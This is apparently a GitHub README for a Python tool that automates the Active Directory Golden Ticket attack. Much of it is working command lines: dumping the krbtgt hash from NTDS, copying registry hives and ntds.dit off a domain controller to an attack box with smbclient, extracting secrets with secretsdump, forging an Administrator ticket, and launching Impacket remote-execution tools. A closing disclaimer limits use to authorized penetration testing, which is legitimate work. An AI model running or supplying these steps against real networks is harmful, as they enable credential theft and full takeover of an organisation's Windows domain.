# Golden Ticket Tool

A Python wrapper that automates the Golden Ticket attack chain using NetExec and Impacket.

<img width="471" height="295" alt="golden_ticket" src="https://github.com/user-attachments/assets/83ac772e-e7dc-45b5-a408-5f934fe1de79" />

<img width="804" height="180" alt="image" src="https://github.com/user-attachments/assets/b186ccc6-73c7-476b-9da6-362619efad60" />


## Installation & Execution

Install from Github

```sh
cd %DIRECTORY_of_your_choosing%
sudo git clone https://github.com/NEED-Programming/Golden-Ticket.git
sudo chmod +x golden_ticket.sh
or
sudo chmod +x golden_tickets.py
```

## What It Does

1. Retrieves the Domain SID via LDAP (falls back to SMB if LDAP fails)
2. Dumps the krbtgt NT hash from NTDS via SMB
3. Forges a Golden Ticket using `impacket-ticketer` for user 'Administrator'
4. Allows execution of Kali Default Impacket PsExec, WMIExec, SMBExec, and ATExec for Post Exploit ✨Magic ✨
5. Generates a ready-to-run shell script for your chosen Impacket tool

## Requirements

### Python dependency
```bash
pip install colorama --break-system-packages
```

### NetExec
```bash
# Kali Linux (recommended)
sudo apt install netexec -y

# Or via pipx
pipx install netexec

# Verify install
nxc --version
```

### Impacket
```bash
# Kali Linux
sudo apt install impacket-scripts -y

# Or via pip
pip install impacket --break-system-packages
```

The following tools must be available in your PATH:
- `nxc` (NetExec)
- `impacket-ticketer`
- `impacket-psexec` / `impacket-wmiexec` / `impacket-smbexec` / `impacket-atexec`

## Usage

```bash
python3 golden_tickets.py --ip <DC_IP> --user <USER> --domain <DOMAIN> [-p PASSWORD | -H HASH]
```

### Arguments

| Flag | Description |
|---|---|
| `--ip` | Target Domain Controller IP |
| `--user` | Username with domain admin privileges |
| `--domain` | Domain name (e.g. `marvel.local`) |
| `-p` / `--password` | Password for authentication |
| `-H` / `--hashes` | NT hash (accepts `NTHASH` or `LMHASH:NTHASH`) |

`--password` and `--hashes` are mutually exclusive — use one or the other.

## Examples

```bash
# Password authentication
python3 golden_ticket.py --ip 192.168.1.10 --user administrator -p '$Password' --domain marvel.local

# NT hash only
python3 golden_ticket.py --ip 192.168.1.10 --user administrator -H $NTHash --domain marvel.local

# Full LM:NT hash
python3 golden_ticket.py --ip 192.168.1.10 --user administrator -H $LMHASH:NTHASH --domain marvel.local
```

## Output

The script produces two files:

- `Administrator.ccache` — the forged Kerberos ticket
- `run_impacket.sh` — shell script with the correct `KRB5CCNAME` export and Impacket command

Run the generated script:
```bash
./run_impacket.sh
```

## Notes

### Clock Sync
Kerberos requires your clock to be within 5 minutes of the DC. If you get `KRB_AP_ERR_SKEW`:
```bash
sudo timedatectl set-timezone UTC
sudo date -s "$(nmap --script smb2-time <DC_IP> | grep 'date:' | awk '{print $2}')"
```

### DNS Resolution
Kerberos uses hostnames, not IPs. If you get `KDC_ERR_S_PRINCIPAL_UNKNOWN`:
```bash
echo "<DC_IP> <HOSTNAME> <HOSTNAME>.<DOMAIN>" | sudo tee -a /etc/hosts
```

### AES vs RC4
Modern Windows Server (2019/2022) may reject RC4-based (NTLM) Golden Tickets. If you get `KDC_ERR_TGT_REVOKED`, extract the krbtgt AES256 key and forge it manually offline as shown below:
```bash
impacket-wmiexec -hashes $LMHASH:NTHASH \
  marvel.local/Administrator@$IP

reg save HKLM\SYSTEM C:\Windows\Temp\sys.hiv

reg save HKLM\SAM C:\Windows\Temp\sam.hiv

ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\dump" q q

exit

## Then download the tickets to your attack box via Smbclient

smbclient //$IP/C$ -U 'administrator' \
  --pw-nt-hash $NTHash \
  -c 'get Windows\Temp\sys.hiv /tmp/sys.hiv'

smbclient //$IP/C$ -U 'administrator' \
  --pw-nt-hash $NTHash \
  -c 'get "Windows\Temp\dump\Active Directory\ntds.dit" /tmp/ntds.dit'

impacket-secretsdump -ntds /tmp/ntds.dit -system /tmp/sys.hiv LOCAL | grep krbtgt
impacket-ticketer -aesKey <AES256_KEY> -domain-sid <SID> -domain <DOMAIN> -user-id 500 -groups 512,513,518,519,520 Administrator
```

### Hash Format
The LM hash `aad3b435b51404eeaad3b435b51404ee` is the standard empty LM hash on all modern Windows systems. The NT hash is the only value that matters.


## Video
https://vimeo.com/1106493100

## Disclaimer

This tool is intended for authorized penetration testing and educational research only. Do not use against systems you do not have explicit permission to test.
